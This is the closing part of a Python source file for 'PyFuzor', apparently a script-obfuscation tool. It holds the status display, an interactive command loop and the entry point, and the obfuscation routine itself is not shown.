    print(f"│ Symbol Mapping  : {ANSI_YELLOW}Renamed & Flattened{ANSI_RESET}{ANSI_CYAN}           │")
    print(f"│ Bytecode Mode   : {ANSI_YELLOW}{'Enabled' if config.get('bytecode_obfuscation', {}).get('enabled') else 'Disabled'}{ANSI_RESET}{ANSI_CYAN}                    │")
    print(f"│ Anti-Trace      : {ANSI_YELLOW}Active{ANSI_RESET}{ANSI_CYAN}                          │")
    print(f"└───────────────────────────────────────────────┘{ANSI_RESET}\n")

def main_cli():
    clear_screen()
    print(LOGO)
    print(f"{ANSI_YELLOW}Commands: obf <name>, help, exit, clear{ANSI_RESET}")
    print(f"{ANSI_CYAN}Note: Extensions are optional (.py will be added automatically){ANSI_RESET}\n")

    while True:
        try:
            cmd_input = input(f"{ANSI_MAGENTA}{ANSI_BOLD}PyFuzor >>> {ANSI_RESET}").strip()
            if not cmd_input: continue

            parts = cmd_input.split()
            cmd = parts[0].lower()

            if cmd == "exit" or cmd == "quit":
                print(f"{ANSI_MAGENTA}Closing PyFuzor. Stay safe!{ANSI_RESET}")
                break
            elif cmd in ["obfuscate", "obf"]:
                if len(parts) < 2:
                    print(f"{ANSI_RED}Usage: {cmd} <filename>{ANSI_RESET}")
                else:
                    process_obfuscation(parts[1])
            elif cmd == "help":
                 print(f"{ANSI_CYAN}Commands:\n  - obf <filename>     : Obfuscate a python script\n  - help                : Show this message\n  - clear               : Clear the screen\n  - exit                : Quit the program{ANSI_RESET}")
            elif cmd == "clear":
                clear_screen()
                print(LOGO)
            else:
                print(f"{ANSI_RED}Unknown command: {cmd}{ANSI_RESET}")
        except KeyboardInterrupt:
            print(f"\n{ANSI_MAGENTA}Closing PyFuzor.{ANSI_RESET}")
            break
        except Exception as e:
            print(f"{ANSI_RED}Error: {e}{ANSI_RESET}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        cmd = sys.argv[1].lower()
        if cmd in ["obfuscate", "obf"] and len(sys.argv) > 2:
            process_obfuscation(sys.argv[2])
        else:
            process_obfuscation(sys.argv[1])
    else:
        main_cli()
